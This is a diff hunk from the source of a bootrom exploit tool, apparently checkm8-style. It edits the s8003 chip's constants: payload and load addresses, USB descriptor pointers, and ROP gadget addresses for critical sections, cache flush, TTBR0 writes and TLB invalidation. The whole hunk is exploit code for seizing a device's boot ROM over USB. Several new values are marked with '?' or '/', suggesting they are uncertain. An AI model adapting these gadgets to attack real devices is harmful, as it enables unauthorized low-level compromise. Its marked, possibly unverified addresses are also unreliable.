@@ -261,31 +261,31 @@ def payload(cpid):
     return t8002_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8002_shellcode)) + t8002_handler
   if cpid == 0x8003:
     constants_usb_s8003 = [
-               0x1800B0000, # 1 - LOAD_ADDRESS
-        0x6578656365786563, # 2 - EXEC_MAGIC
-        0x646F6E65646F6E65, # 3 - DONE_MAGIC
-        0x6D656D636D656D63, # 4 - MEMC_MAGIC
-        0x6D656D736D656D73, # 5 - MEMS_MAGIC
-               0x10000DC98, # 6 - USB_CORE_DO_IO
+               0x1800B0000, # 1 - LOAD_ADDRESS ?
+        0x6578656365786563, # 2 - EXEC_MAGIC ?
+        0x646F6E65646F6E65, # 3 - DONE_MAGIC ?
+        0x6D656D636D656D63, # 4 - MEMC_MAGIC ?
+        0x6D656D736D656D73, # 5 - MEMS_MAGIC ?
+               0x10000EE78, # 6 - USB_CORE_DO_IO /
     ]
     constants_checkm8_s8003 = [
-               0x180088A30, # 1 - gUSBDescriptors
-               0x180083CF8, # 2 - gUSBSerialNumber
-               0x10000D150, # 3 - usb_create_string_descriptor
-               0x1800805DA, # 4 - gUSBSRNMStringDescriptor
+               0x1800877E8, # 1 - gUSBDescriptors 87830 /
+               0x180087958, # 2 - gUSBSerialNumber /
+               0x10000E354, # 3 - usb_create_string_descriptor /
+               0x1800807DA, # 4 - gUSBSRNMStringDescriptor /
                0x1800AFC00, # 5 - PAYLOAD_DEST
-      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
-        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
+      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET /
+        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE /
                0x180088B48, # 8 - PAYLOAD_PTR
     ]
-    s8003_func_gadget              = 0x10000DE14
-    s8003_enter_critical_section   = 0x10000B458
-    s8003_exit_critical_section    = 0x10000B4BC
-    s8003_dc_civac                 = 0x10000042C
-    s8003_write_ttbr0              = 0x1000003A4
-    s8003_tlbi                     = 0x1000003F4 # tlbi_alle3 not tlbi_vmalle1
-    s8003_dmb                      = 0x100000438
-    s8003_handle_interface_request = 0x10000F1B0
+    s8003_func_gadget              = 0x10000DE14 # /
+    s8003_enter_critical_section   = 0x10000B458 # /
+    s8003_exit_critical_section    = 0x10000B4BC # /
+    s8003_dc_civac                 = 0x10000042C # /
+    s8003_write_ttbr0              = 0x1000003A4 # /
+    s8003_tlbi                     = 0x1000003F4 # / tlbi_alle3 not tlbi_vmalle1
+    s8003_dmb                      = 0x100000438 # /
+    s8003_handle_interface_request = 0x10000F1B0 # /
     s8003_callbacks = [
       (s8003_dc_civac, 0x1800B0600),
       (s8003_dmb, 0),
